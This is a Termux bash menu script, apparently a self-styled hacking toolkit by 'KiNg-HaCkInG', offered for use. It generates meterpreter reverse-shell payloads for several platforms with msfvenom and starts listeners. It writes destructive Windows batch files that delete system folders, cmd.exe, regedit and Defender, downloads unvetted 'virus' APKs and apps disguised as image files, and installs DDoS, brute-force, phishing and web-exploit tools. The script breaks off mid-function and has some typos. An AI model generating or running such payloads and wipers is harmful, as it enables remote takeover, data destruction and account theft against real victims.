clear

green='\e[1;32m'
cyan='\e[1;36m'
red='\e[1;31m'
blue='\e[1;34m'
white='\e[1;35m'
yellow='\e[1;33m'

clear
echo ''
echo ''
echo -e $red      "FB: KING.HACKING.SY       TELEGRAM: HACKEER1        INSTA: KING1HACKING"
echo ""
toilet " MR.KING" | lolcat
echo ''
echo -e $green"                    <<<$red The Script By: KiNg-HaCkInG $green>>>"
echo -e $green"                      <<<$red Virtual Justice System $green>>>"
echo ''
echo -e $green   "1- PAYLOADS"
echo ""
echo -e $green   "2- VIRUSAT"
echo ""
echo -e $green   "3- TOOLS HACKING"
echo ""
echo -e $green   "4- MAKE WORDLIST"
echo ""
echo -e $green   "5- DOWNLOAD YOUTUBE"
echo ""
echo -e $green   "6- STYLE TERMUX"
echo ""
echo -e $green   "7- MAKE HASH"
echo ""
echo -e $green   "0- EXIT"
echo ""
echo ""
read -p "Enter The Number: " name
#########################
if [ $name = 0 ]
then
clear
echo ""
echo ""
toilet "EXIT" | lolcat
echo ""
echo -e $red "   TELEGRAM: $green  HACKEER1"
echo -e $red "   FACEBOOK: $green  KING.HACKING.SY"
echo -e $red "   INSTAGRA: $green  king1hacking"
echo -e $red "   WHATSAPP: $green  00963937376654"
echo ""
echo ""
exit
fi
#######################
if [ $name = 1 ]
then
clear
echo
echo
echo -e $red
echo -e       "FB: KING.HACKING.SY       TELEGRAM: HACKEER1        INSTA: KING1HACKING"
toilet " PaYlOaDs" | lolcat
echo -e $green"                    ($red The Script By: KiNg-HaCkInG $green)"
echo ""
echo -e $red       "PAYLOADS"
echo ""
echo -e $green     "1- Payload Android"
echo -e $green     "2- Payload Windows"
echo -e $green     "3- Payload Linux"
echo -e $green     "4- Payload Mac"
echo -e $green     "5- Payload ISO"
echo -e $green     "6- Payload Python"
echo ""
echo -e $green     "99- BACK"
echo ""
echo -e $green
read -p "Enter The Number: " payload
if [ $payload = 1 ]
then
clear
echo -e $green
toilet "ANDROID" | lolcat
echo -e $red  "                PAYLOADS ANDROID"
echo ""
echo -e $blue "1- Make payload"
echo ""
echo -e $blue "2- Start metasploit"
echo ''
echo -e $blue "00- Back"
echo -e $green
read -p "Enter The Number: " android
if [ $android = 00 ]
then
clear
bash MRKING.sh
fi
if [ $android = 1 ]
then
echo -e $green
read -p "LHOST: " lhost
echo ""
read -p "LPORT: " lport
echo ""
read -p "Name Payload: " name
echo ""
toilet "Loading" | lolcat
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> $HOME/$name.apk
fi
if [ $android = 2 ]
then
echo -e $green
read -p "LHOST: " host
echo ""
read -p "LPORT: " port
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
fi
fi
if [ $payload = 2 ]
  then
clear
echo -e $green
toilet "WINDOWS" | lolcat
echo -e $red   "                PAYLOADS WINSOWS"
echo ""
echo -e $blue "1- Make payload"
echo ""
echo -e $blue "2- Start metasploit"
echo ""
echo -e $blue "00- Back"
echo -e $green
read -p "Enter The Number: " windows
if [ $windows = 00 ]
then
clear
bash MRKING.sh
fi
if [ $windows = 1 ]
then
echo -e $green
read -p "LHOST: " lhost
echo -e $green
read -p "LPORT: " lport
echo -e $green
read -p "Name Payload: " name
echo ""
toilet "loading" | lolcat
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o/$HOME/$name.exe
fi
if [ $windows = 2 ]
then
echo -e $green
read -p "LHOST: " host
echo -e $green
read -p "LPORT: " port
echo ""
toilet "START" lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
fi
fi
if [ $payload = 3 ]
 then
clear
toilet "LINUX" | lolcat
echo ""
echo -e $red  "                 PAYLOADS LINUX"
echo ""
echo -e $blue "1- Make payload"
echo ""
echo -e $blue "2- Start metasploit"
echo ""
echo -e $blue "00- Back"
echo -e $green
read -p "Enter The Number: " linux
if [ $linux = 00 ]
then
clear
bash MRKING.sh
fi
if [ $linux = 1 ]
then
echo -e $green
read -p "LHOST: " lhost
echo -e $green
read -p "LPORT: " lport
echo -e $green
read -p "Name Payload: " name
echo ""
toilet "Loading" | lolcat
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$lhost LPORT=$lport -o/$HOME/$name.elf
fi
if [ $linux = 2 ]
then
echo -e $green
read -p "LHOST: " host
echo -e $green
read -p "LPORT: " port
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
clear
echo -e $green"Save Payload To" $HOME/$namp.elf
fi
fi
if [ $payload = 4 ]
 then
clear
toilet "MAC" | lolcat
echo ""
echo -e $red  "                 PAYLOADS MAC"
echo ""
echo -e $blue "1- Make payload"
echo ""
echo -e $blue "2- Start metasploit"
echo ""
echo -e $blue "00- Back"
echo -e $green
read -p "Enter The Number: " mac
if [ $mac = 00 ]
then
clear
bash MRKING.sh
fi
if [ $mac = 1 ]
then
echo -e $green
read -p "LHOST: " lhost
echo -e $green
read -p "LPORT: " lport
echo -e $green
read -p "Name Payload: " name
echo ""
toilet "Loading" | lolcat
msfvenom -p osx/x64/meterpreter_reverse_tcp   -f macho  LHOST=$lhost LPORT=$lport   -o/$HOME/$name.macho
fi
if [ $mac = 2 ]
then
echo -e $green
read -p "LHOST: " host
echo -e $green
read -p "LPORT: " port
echo
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
fi
fi

if [ $payload = 5 ]
 then
clear
toilet "ISO_APPL" | lolcat
echo ""
echo -e $red  "                 PAYLOADS ISO"
echo ""
echo -e $blue "1- Make payload"
echo ""
echo -e $blue "2- Start metasploit"
echo ""
echo -e $blue "00- Back"
echo -e $green
read -p "Enter The Number: " iso
if [ $iso = 00 ]
then
clear
bash MRKING.sh
fi
if [ $iso = 1 ]
then
echo -e $green
read -p "LHOST: " lhost
echo -e $green
read -p "LPORT: " lport
echo -e $green
read -p "Name Payload: " name
echo -e $red
toilet "Loading" | lolcat
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp  LHOST=$lhost LPORT=$lport -o/$HOME/$name.api
fi
if [ $iso = 2 ]
then
echo -e $green
read -p "LHOST: " lhost
echo -e $green
read -p "LPORT: " lport
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit'
fi
fi
if [ $payload = 99 ]
 then
clear
bash MRKING.sh
fi
if [ $payload = 6 ]
 then
clear
toilet "PYTHON" | lolcat
echo ""
echo -e $red "          PAYLOADS PYTHON"
echo ""
echo -e $blue "1- Make payload"
echo ""
echo -e $blue "2- Start metasploit"
echo ""
echo -e $blue "00- Back"
echo -e $green
read -p "Enter The Number: " python
if [ $python = 00 ]
then
clear
bash MRKING.sh
fi
if [ $python = 1 ]
then
echo -e $green
read -p "LHOST" lhost
echo -e $green
read -p "LPORT: " lport
echo -e $green
read -p "Name Payload: " name
echo ""
toilet "Loading" | lolcat
msfveno -f raw -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> $HOME/$name.py
fi
if [ $python = 2 ]
then
echo -e $green
"LHOST: " lhost
echo -e $green
read -p "LPORT: " lport
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit'
fi
fi
fi
###############################
if [ $name = 2 ]
then
mkdir virus
clear
echo -e $red
echo ""
echo -e       "FB: KING.HACKING.SY       TELEGRAM: HACKEER1        INSTA: KING1HACKING"
echo ''
toilet " ViRuSaT" | lolcat
echo ""
echo -e $green"                    ($red The Script By: KiNg-HaCkInG $green)"
echo ""
echo -e $red"{ "$blue"1 "$red"}" $green"Android"
echo ""
sleep 0.1
echo -e $red"{ "$blue"2 "$red"}" $green"Windows"
echo ""
sleep 0.1
echo -e $red"{ "$blue"3 "$red"}" $green"Mac"
echo ""
sleep 0.1
echo -e $red"{ "$blue"4 "$red"}" $green"WhatsApp"
echo ""
sleep 0.1
echo -e $red"{ "$blue"0 "$red"}" $green"BACK"
echo -e $cyan
sleep 0.1
read -p "Enter The Number: " media
if [ $media = 0 ]
then
clear
bash MRKING.sh
fi
if [ $media = 1 ]
then
clear
echo -e $red
toilet "Android" | lolcat
echo""
echo -e $red"{ "$blue"1 "$red"}" $green"ELITE" $blue">>>>>>" $green"{ Format Android }"
echo ""
echo -e $red"{ "$blue"2 "$red"}" $green"Sleep" $blue">>>>>>" $green"{ Sleep Android + kay 86515 }"
echo ""
echo -e $red"{ "$blue"3 "$red"}" $green"dateater"  $blue">>>>>>" $green"{ Script remove Sdcard }"
echo ""
echo -e $red"{ "$blue"0 "$red"}" $green"Back"
echo ""
read -p "Enter The Number: " android
if [ $android = 0 ]
then
clear
bash MRKING.sh
fi
if [ $android = 1 ]
then
echo -e $green "START DOWNLOAD......"
wget -q http://override.waper.co/files/31337.apk
mkdir virus/android
mv 31337.apk virus/android/ELITE.apk
bash MRKING.sh
fi
if [ $android = 2 ]
then
echo -e $green "START DOWNLOAD......"
wget -q https://a.top4top.net/p_859u1on31.jpg
mkdir virus/android
mv p_859u1on31.jpg virus/android/Sleep.apk
bash MRKING.sh
fi
if [ $android = 3 ]
then
echo -e $green "START DOWNLOAD......"
wget -q http://override.waper.co/files/dateater.apk
mkdir virus/android
mv dateater.apk virus/android/dateater.sh
bash MRKING.sh
fi
fi
if [ $media = 4 ]
then
clear
echo -e $red
toilet "WhatsApp" | lolcat
echo ""
echo -e $red"{ "$blue"1 "$red"}" $green"WhatsApp Bomber" $blue">>>>>>" $green"{ Stop WhatsApp }"
echo ""
echo -e $red"{ "$blue"0 "$red"}" $green"Back"
echo ""
read -p "Enter The Number: " whatsapp
if [ $whatsapp = 0 ]
then
bash MRKING.sh
fi
if [ $whatsapp = 1 ]
then
echo -e $green
read -p "What Is your Name: " name
echo $name > whatsapp.txt
echo "" >> whatsapp.txt
cat W.txt >> whatsapp.txt
mkdir virus/whatsapp
mv whatsapp.txt virus/whatsapp
echo -e $green
echo "Enter ( cat virus/whatsapp/whatsapp.txt ) "
echo
echo
echo -e $blue
read -p "Prease Enter To The Back" back
bash MRKING.sh
fi
fi
if [ $media = 2 ]
then
clear
echo -e $red
toilet "Windows" | lolcat
echo ""
echo -e $red"{ "$blue"1 "$red"}" $green"Stop Net"
echo ""
echo -e $red"{ "$blue"2 "$red"}" $green"Remove System"
echo ""
echo -e $red"{ "$blue"3 "$red"}" $green"Remove System32"
echo ""
echo -e $red"{ "$blue"4 "$red"}" $green"Remove CMD"
echo ""
echo -e $red"{ "$blue"5 "$red"}" $green"Voice without interruption"
echo ""
echo -e $red"{ "$blue"6 "$red"}" $green"Delete protection"
echo ""
echo -e $red"{ "$blue"7 "$red"}" $green"Delete regedit"
echo ""
echo -e $red"{ "$blue"0 "$red"}" $green"Back"
echo ""
read -p "Enter The Number: " windows
if [ $windows = 0 ]
then
bash MRKING.sh
fi
if [ $windows = 1 ]
then
mkdir virus/windows
echo -e $green "START DOWNLOAD......"
echo "ipconfig /release" > b.bat
mv b.bat virus/windows/StopNet.bat
bash MRKING.sh
fi
if [ $windows = 2 ]
then
echo -e $green "START DOWNLOAD......"
mkdir virus/windows
echo " @echo off">a
echo "Del C:\Windows">>a
echo "Del C:\Users">>a
echo "Del C:\Program Files (x86) ">>a
echo "Del C:\Program Files">>a
echo "Del C:\PerfLogs">>a
echo "Del C:/Windows/Boot">>a
echo "Del C:/Windows/Shell">>a
echo "Del C:/Windows/System32">>a
echo "Del c:\windows\system\msconfig.exe">>a
echo "Del c:\windows\Rundll32.exe">>a
echo "Del c:\windows\regedit.exe">>a
echo "Del c:\windows\Rundll.exe">>a
echo "Del c:\Autoexec.bat">>a
echo "Del c:\command.com">>a
echo "Del c:\windows\Logos.sys">>a
echo "Del c:\windows\Logow.sys">>a
echo "Del c:\windows\Scanregw.exe">>a
mv a virus/windows/remove_system.bat
bash MRKING.sh
fi
if [ $windows = 3 ]
then
mkdir virus/windows
echo -e $green "START DOWNLOAD......"
echo "@echo off">a
echo "cls">>a
echo "@echo off">>a
echo "DEL C:\Windows\System32">>a
mv a virus/windows/Remove_System32.bat
bash MRKING.sh
fi
if [ $windows = 4 ]
then
mkdir virus/windows
echo -e $green "START DOWNLOAD......"
echo "@echo off">a
echo "cls">>a
echo "@echo off">>a
echo "DEL C:\Windows\System32\cmd.exe">>a
mv a virus/windows/Remove_CMD.bat
bash MRKING.sh
fi
if [ $windows = 5 ]
then
mkdir virus/windows
echo -e $green "START DOWNLOAD......"
echo "@echo off">a
echo "cls">>a
echo "@echo off">>a
echo ":funcao">>a
echo "ECHO">>a
echo "CLS">>a
echo "GOTO funcao">>a
mv a virus/windows/Sound_out.bat
bash MRKING.sh
fi
if [ $windows = 6 ]
then
mkdir virus/windows
echo -e $green "START DOWNLOAD......"
echo "@echo off">a
echo "cls">>a
echo "@echo off">>a
echo "DEL C:\Program Files\Windows Defender">>a
mv a virus/windows/Delet_protection.bat
bash MRKING.sh
fi
if [ $windows = 7 ]
then
mkdir virus/windows
echo -e $green "START DOWNLOAD......"
echo "@echo off">a
echo "cls">>a
echo "@echo off">>a
echo "DEL C:\Windows\System32\regedit.exe">>a
mv a virus/windows/Delete_regedit.bat
bash MRKING.sh
fi
fi
if [ $media = 3 ]
then
clear
echo -e $red
toilet "Mac" | lolcat
echo ""
echo -e $red"{ "$blue"1 "$red"}" $green"TRINOIDS"
echo ""
echo -e $red"{ "$blue"2 "$red"}" $green"NOTHING"
echo ""
echo -e $red"{ "$blue"0 "$red"}" $green"Back"
echo ""
read -p "Enter The Number: " mac
if [ $mac = 0 ]
then
bash MRKING.sh
fi
if [ $mac = 1 ]
then echo -e $green "START DOWNLOAD......"
wget -q https://a.top4top.net/p_859uyc6l1.jpg
mkdir virus/mac
mv p_859uyc6l1.jpg virus/mac/TRINOIDS.app
bash MRKING.sh
fi
if [ $mac = 2 ]
then
echo -e $green "START DOWNLOAD......"
wget -q https://f.top4top.net/p_859r4sak1.jpg
mkdir virus/mac
mv p_859r4sak1.jpg virus/mac/nothing.app
bash MRKING.sh
fi
fi
fi
######################
if [ $name = 3 ]
then
clear
figlet "TOOLS HACKER"
echo -e $blue "                   THE TOOL BY KING HACKING"
echo -e $blue "                    whatsapp 00963937376654"
echo -e $green     "MINE TOOLS"
echo -e $green     "1-DDOS"
echo -e $green     "2-WEB HACK"
echo -e $green     "3-WIFI HACK"
echo -e $green     "4-PAYLOAD"
echo -e $green     "5-wordlist"
echo -e $green     "6-Password Attacks"
echo -e $green     "7-Tools Root"
echo -e $green     "8-Other"
echo ""
echo -e $green     "55-back"
echo ""
echo -e $green
read -p "Entar the number: " mine


if [ $mine = 55 ]
then
clear
bash MRKING.sh
fi
if [ $mine = 1 ]
then
clear
echo -e $red
figlet "DDOS"
echo -e $green "1-Xerxes"
echo -e $green "2-Hammer"
echo -e $green "3-Slowloris"
echo ""
echo -e $green "66-back"
echo ""
echo -e $green
read -p "Enter the Number: " ddos
if [ $ddos = 66 ]
then
clear
bash MRKING.sh
fi
if [ $ddos = 1 ]
then
clear
echo -e $red
figlet "xerxes"
cd ~
git clone https://github.com/zanyarjamal/xerxer.git
fi
if [ $ddos = 2 ]
then
clear
echo -e $red
figlet "hammer"
cd ~
git clone https://github.com/cyweb/hammer.git
fi
if [ $ddos = 3 ]
then
clear
echo -e $red
figlet "Slowloris"
cd ~
git clone https://github.com/gkbrk/slowloris.git
fi
fi
if [ $mine = 2 ]
then
 clear
 echo -e $red
figlet "WEB HACK"
echo -e $green "1-admin-panel-finder"
echo -e $green "2-WPSeku"
echo -e $green "3-InjeCtor-SY"
echo -e $green "4-0xSQLiNJ"
echo -e $green "5-0xFinder"
echo -e $green "6-sqlmap"
echo -e $green "7-WPSploit"
echo -e $green "8-sqldump"
echo -e $green "9-Websploit"
echo -e $green "10-Xshell"
echo -e $green "11-XAttacker"
echo -e $green "12-XSStrike"
echo -e $green "13-Breacher"
echo -e $green "14-OWScan"
echo -e $green "15-xGans"
echo -e $green "16-Webdav Mass Exploit"
echo -e $green "17-Nmap"
echo ""
echo -e $green "66-back"
echo ""
echo -e $green
read -p "Enter the Number: " web
if [ $web = 66 ]
then
clear
bash MRKING.sh
fi
if [ $web = 1 ]
then
clear
echo -e $red
figlet "admin-panel-finder"
cd ~
git clone https://github.com/bdblackhat/admin-panel-finder.git
fi
if [ $web = 2 ]
then
clear
echo -e $red
figlet "WPSeku"
cd ~
git clone https://github.com/m4ll0k/WPSeku.git
fi
if [ $web = 3 ]
then clear
echo -e $red
figlet "InjeCtor-SY"
cd ~
git clone https://github.com/omarsalloum/InjeCtor-SY.git
fi
if [ $web = 4 ]
then
clear
echo -e $red
figlet "0xSQLiNJ"
cd ~
git clone https://github.com/0xAbdullah/0xSQLiNJ
fi
if [ $web = 5 ]
then
clear
echo -e $red
figlet "0xFinder"
cd ~
git clone https://github.com/0xAbdullah/0xFinder
fi
if [ $web = 6 ]
then
clear
echo -e $red
figlet "sqlmap"
cd ~
git clone https://github.com/sqlmapproject/sqlmap
fi
if [ $web = 7 ]
then
clear
echo -e $red
figlet "WPSploit"
cd ~
git clone https://github.com/m4ll0k/wpsploit
fi
if [ $web = 8 ]
then
clear
echo -e $red
figlet "sqldump"
cd ~
apt update && apt upgrade
apt install python2 curl
pip2 install google
curl -k -O https://gist.githubusercontent.com/Gameye98/76076c9a
mkdir ~/sqldump && chmod +x sqldump.py && mv sqldump.py ~/sqldu
fi
if [ $web = 9 ]
then
cleat
echo -e $red
figlet "Websploit"
cd ~
git clone https://github.com/The404Hacking/websploit
fi
if [ $web = 10 ]
then
clear
echo -e $red
figlet "Xshell"
cd ~
git clone clone https://github.com/Ubaii/Xshell
fi
if [ $web = 11 ]
then
clear
figlet "XAttacker"
cd ~
git clone https://github.com/Moham3dRiahi/XAttacker
fi
if [ $web = 12 ]
then
clear
echo -e $red
figlet "XSStrike"
cd ~
git clone https://github.com/UltimateHackers/XSStrike
fi
if [ $web = 13 ]
then
clear
echo -e $red
figlet "Breacher"
cd ~
git clone https://github.com/UltimateHackers/Breacher
fi
if [ $web = 14 ]
then
clear
echo -e $red
figlet "OWScan"
cd ~
git clone https://github.com/Gameye98/OWScan
fi
if [ $web = 15 ]
then
clear
echo -e $red
figlet "xGans"
cd ~
apt update && apt upgrade
apt install python2 curl
mkdir ~/xGans
curl -O http://override.waper.co/files/xgans.txt
mv xgans.txt ~/xGans/xgans.py
echo "####DONE....!!"
fi
if [ $web = 16 ]
then
clear
echo -e $red
figlet "Webdav Mass Exploit"
cd ~
apt install python2 openssl curl libcurl
pip2 install requests
curl -k -O https://pastebin.com/raw/K1VYVHxX && mv K1VYVHxX webdav.py
mkdir ~/webdav-mass-exploit && mv webdav.py ~/webdav-mass-exploit
echo "####DONE....!!"
fi
if [ $web = 17 ]
then
clear
echo -e $red
figlet "Nmap"
cd ~
apt update && apt upgrade
pkg install nmap -y
fi
fi
if [ $mine = 3 ]
then
clear
echo -e $red
figlet "WIFI HACK"
echo -e $green "1-3vilTwinAttacker"
echo -e $green "2-flux"
echo -e $green "3-routersploit"
echo -e $green "4-wifite"
echo -e $green "5-wifite2"
echo -e $green "6-wps-scripts"
echo ""
echo -e $green "66-back"
echo ""
echo -e $green
read -p "Enter the Number: " wifi
if [ $wifi = 66 ]
then
clear
bash MRKING.sh
fi
if [ $wifi = 1 ]
then
clear
echo -e $red
figlet "3vilTwinAttacker"
cd ~
git clone https://github.com/P0cL4bs/3vilTwinAttacker.git
fi
if [ $wifi = 2 ]
then
clear
echo -e $red
figlet "flux"
cd ~
git clone https://github.com/facebook/flux.git
fi
if [ $wifi = 3 ]
then
clear
echo -e $red
figlet "RouterSploit"
cd ~
git clone https://github.com/reverse-shell/routersploit
fi
if [ $wifi = 4 ]
then
clear
echo -e $red
figlet "wifite"
cd ~
wget https://raw.github.com/derv82/wifite/master/wifite.py
fi
if [ $wifi = 5 ]
then
clear
echo -e $red
figlet "wifite2"
cd ~
git clone https://github.com/derv82/wifite2.git
fi
if [ $wifi = 6 ]
then
clear
echo -e $red
figlet "wps-scripts"
cd ~
git clone https://github.com/0x90/wps-scripts.git
fi
fi
if [ $mine = 4 ]
then
clear
echo -e $red
figlet "PAYLOAD"
echo -e $green "1-PAYMAX"
echo -e $green "2-Routersploit"
echo -e $green "3-TXTool"
echo -e $green "4-A-Rat"
echo -e $green "5-t-shell"
echo ""
echo -e $green "66-back"
echo ""
echo -e $green
read -p "Enter The Number: " payload
if [ $payload = 66 ]
then
clear
bash MRKING.sh
fi
if [ $payload = 1 ]
then
clear
echo -e $red
figlet "PAYMAX"
cd ~
git clone https://github.com/Matrix07ksa/PAYMAX
fi
if [ $payload = 2 ]
then
clear
echo -e $red
figlet "RouterSploit"
cd ~
git clone https://github.com/reverse-shell/routersploit
fi
if [ $payload = 3 ]
then
clear
echo -e $red
figlet "Txtool"
cd ~
git clone https://github.com/kuburan/txtool
fi
if [ $payload = 4 ]
then
clear
echo -e $red
figlet "A-RAT"
cd ~
git clone https://github.com/Xi4u7/A-Rat
fi
if [ $payload = 5 ]
then
clear
echo -e $red
figlet "t-shell"
cd ~
git clone https://github.com/laser010/t-shell
fi
fi
if [ $mine = 5 ]
then
clear
echo -e $red
figlet "WORDLIST"
echo -e $green "1-mkls"
echo -e $green "2-crunch"
echo ""
echo -e $green "66-back"
echo ""
echo -e $green
read -p "Enter the Number: " wordlist
if [ $wordlist = 1 ]
then
clear
echo -e $red
figlet "mkls"
cd ~
git clone https://github.com/laser010/mkls
fi
if [ $wordlist = 2 ]
then
clear
echo -e $red
figlet "crunch"
cd ~
git clone https://github.com/KURO-CODE/Crunch-Cracker.git
bash MRKING.sh
fi
if [ $wordlist = 66 ]
then
clear
bash MRKING.sh
fi
fi
if [ $mine = 6 ]
then
clear
echo -e $red
figlet "Password Attacks"
echo -e $green "1-Facebook Brute"
echo -e $green "2-Hydra"
echo -e $green "3-Hash Buster"
echo -e $green "4-1337Hash"
echo -e $green "5-InstaHack"
echo -e $green "6-Hashzer"
echo -e $green "7-Hunner"
echo -e $green "8-gmail_attacker"
echo -e $green "9-weeman"
echo -e $green "10-ForceJK"
echo ""
echo -e $green "66-back"
echo ""
echo -e $green
read -p "Enter the Number: " pass
if [ $pass = 1 ]
then
clear
echo -e $red
figlet "Facebook Brute"
cd ~
git clone https://github.com/HackerAdana/facebook-brute-force.git
fi
if [ $pass = 2 ]
then
clear
echo -e $red
figlet "Hydra"
apt update && apt upgrade
apt install hydra
fi
if [ $pass = 3 ]
then
clear
echo -e $red
figlet "Hash Buster"
cd ~
git clone https://github.com/UltimateHackers/Hash-Buster.git
fi
if [ $pass = 4 ]
then
clear
echo -e $red
figlet "1337Hash"
cd ~
git clone https://github.com/Gameye98/1337Hash
fi
if [ $pass = 5 ]
then
echo -e $red
figlet "InstaHack"
cd ~
apt update && apt upgrade
apt install python2 git
pip2 install requests
git clone https://github.com/avramit/instahack
fi
if [ $pass = 6 ]
then
clear
echo -e $red
figlet "Hashzer"
cd ~
git clone https://github.com/Anb3rSecID/Hashzer
fi
if [ $pass= 7 ]
then
clear
echo -e $red
figlet "Hunner"
cd ~
git clone https://github.com/b3-v3r/Hunner.git
fi
if [ $pass = 8 ]
then
clear
echo -e $red
figlet "gmail_attacker"
cd ~
git clone https://github.com/AyoubSirai/gmail_attacker.git
fi
if [ $pass = 9 ]
then
clear
echo -e $red
figlet "weeman"
cd ~
git clone https://github.com/evait-security/weeman.git
fi
if [ $pass = 10 ]
then
clear
echo -e $red
figlet "ForceJK"
cd ~
git clone https://github.com/laser010/ForceJK
fi
if [ $pass = 66 ]
then
clear
bash MRKING.sh
fi
fi
if [ $mine = 7 ]
then
clear
echo -e $red
figlet "Tools Root"
echo -e $green "1-Sudo"
echo -e $green "2-Ubuntu"
echo -e $green "3-Fedora"
echo ""
echo -e $green "66-back"
echo ""
echo -e $green
read -p "Enter the Number: " root
if [ $root = 1 ]
then
clear
echo -e $reed
figlet "Sudo"
cd ~
git clone https://github.com/st42/termux-sudo
fi
if [ $root = 2 ]
then
clear
echo -e $red
figlet "Ubuntu"
cd ~
git clone https://github.com/Neo-Oli/termux-ubuntu
fi
if [ $root = 3 ]
then
clear
echo -e $red
figlet "Fedora"
cd ~
wget https://raw.githubusercontent.com/nmilosev/termux-fedora/master/termux-fedora.sh
fi
if [ $root = 66 ]
then
clear
bash MRKING.sh
fi
fi
if [ $mine = 8 ]
then
clear
echo -e $red
figlet "Tools Other"
echo -e $green "1-Ngrok"
echo -e $green "2-Kali Nethunter"
echo -e $green "3-Termux-Styling"
echo -e $green "4-Scriptux"
echo -e $green "5-IP-Locator"
echo ""
echo -e $green "66-back"
echo ""
echo ""
echo -e $green "Enter the Number:"
read other
if [ $other = 1 ]
then
clear
echo -e $red
figlet "Ngrok"
cd ~
git clone https://github.com/themastersunil/ngrok
fi
if [ $other = 2 ]
then
clear
echo -e $red
figlet "Kali Nethunter"
cd ~
git clone https://github.com/Hax4us/Nethunter-In-Termux
fi
if [ $other = 3 ]
then
clear
echo -e $red
figlet "Termux-Styling"
cd ~
git clone https://github.com/BagazMukti/Termux-Styling-Shell-Script
fi
if [ $other = 4 ]
then
clear
echo -e $red
figlet "Scriptux"
cd ~
git clone https://github.com/Gameye98/Scriptux
fi
if [ $other = 5 ]
then
clear
echo -e $red
figlet "IP-Locator"
cd ~
git clone https://github.com/zanyarjamal/IP-Locator.git
fi
if [ $other = 66 ]
then
clear
bash MRKING.sh
fi
fi
fi
################
if [ $name = 4 ]
then
clear
red='\e[1;31m'
blue='\e[1;34m'
green='\e[1;32m'
purple='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;35m'
yellow='\e[1;33m'
echo -e $red
figlet -f slant "#WORDLIST#"
echo -e $green   "<-------------( ######K*I*N*G#H*A*C*K*I*N*G###### )------------->"
sleep 0.1
echo -e $green   "|                                                               |"
sleep 0.1
echo -e $green   "|                                                               |"
sleep 0.1
echo -e $green   "|     $white  Word        $red  By: KiNg-HaCkInG             $white list       $green |"
sleep 0.1
echo -e $green   "|                                                               |"
sleep 0.1
echo -e $green   "|                                                               |"
sleep 0.1
echo -e $green   "<-------------( ######K-I-N-G#H-A-C-K-I-N-G###### )------------->"
sleep 0.1
echo " "
echo -e $red "                    Prease any Kay to the back"
echo
echo -e $green
read -p "Mattresses: " smole
echo -e $green
read -p "Characters Numbers Symbols: " king
echo
echo
echo -e $red "                START WORDLIST"
echo -e $red "                 PLEASE WAIT"
sleep 3
wordlist -m $smole -M $smole -o wordlist.txt $king
clear
echo
echo
echo
echo
echo
figlet -f slant "DONE..."
echo -e $green
echo "SAVE TO wordlist.txt"
sleep 3
bash MRKING.sh
fi
###################
if [ $name = 5 ]
then
clear
termux-setup-storage
mkdir -p ~/.config/youtube-dl
echo '--no-mtime' > ~/.config/youtube-dl/config
echo '-o /storage/emulated/0/KiNgHaCkInG/%(title)s.%(ext)s' >> ~/.config/youtube-dl/config
echo '-f "best[height<=480]"' >> ~/.config/youtube-dl/config
mkdir ~/bin
cd ~/bin
echo 'youtube-dl $1' > termux-url-opener
clear
echo -e $red
echo " WE ARE ANONYMOUS              WE ARE THE SYSTEM"
echo -e $red "         The Script By: KiNg-HaCkInG"
toilet "YOUTUBE" | lolcat
echo ""
echo ""
echo -e $green
read -p "Paste URL Video: " url
echo""
echo""
youtube-dl $url
echo ""
echo -e $green "Done........"
echo -e $green "Save to /storage/emulated/0/KiNgHaCkInG"
sleep 6
bash MRKING.sh
fi
######################
if [ $name = 6 ]
then
clear
toilet "Sleep Tx" | lolcat
echo
echo -e $red "               By:KiNg-HaCkInG"
echo
echo
echo -e $green "1- Style wi'th Sleep Termux"
echo
echo -e $green "2- Style don'T Sleep Termux"
echo
echo -e $green "0- BACK"
echo
echo
read -p "Enter The Number: " sleep
if [ $sleep = 1 ]
then
echo
echo
read -p "Enter The Passowrd" pas
clear
echo
echo
echo
toilet "DONE.."
sleep 2
cd
cd ../usr/etc
echo "green='\e[1;32m'" > bash.bashrc
echo "cyan='\e[1;36m'" >> bash.bashrc
echo "red='\e[1;31m'" >> bash.bashrc
echo "blue='\e[1;34m'" >> bash.bashrc
echo "" >> bash.bashrc
echo "clear" >> bash.bashrc
echo 'toilet "   login"' >> bash.bashrc
echo "echo" >> bash.bashrc
echo "echo" >> bash.bashrc
echo 'echo "Please Enter The Passowrd"' >> bash.bashrc
echo "read pass" >> bash.bashrc
echo 'if [ $pass'" = $pas ]" >> bash.bashrc
echo "then" >> bash.bashrc
echo "clear" >> bash.bashrc
echo 'echo' >> bash.bashrc
echo 'echo -e $red      "FB: KING.HACKING.SY       TELEGRAM: HACKEER1        INSTA: KING1HACKING"' >> bash.bashrc
echo 'echo""'
echo 'toilet " MR.KING" | lolcat' >> bash.bashrc
echo 'echo""' bash.bashrc
echo 'echo -e $green"                    <<<$red The Script By: KiNg-HaCkInG $green>>>"' >> bash.bashrc
echo 'echo' >> bash.bashrc
echo 'PS1="\[\033[01;32m\]KING=>\[\033[01;36m\] "' >> bash.bashrc
echo "else" >> bash.bashrc
echo "clear" >> bash.bashrc
echo "echo" >> bash.bashrc
echo "echo" >> bash.bashrc
echo 'figlet -f slant "PASS ERROR"' >> bash.bashrc
echo "sleep 1" >> bash.bashrc
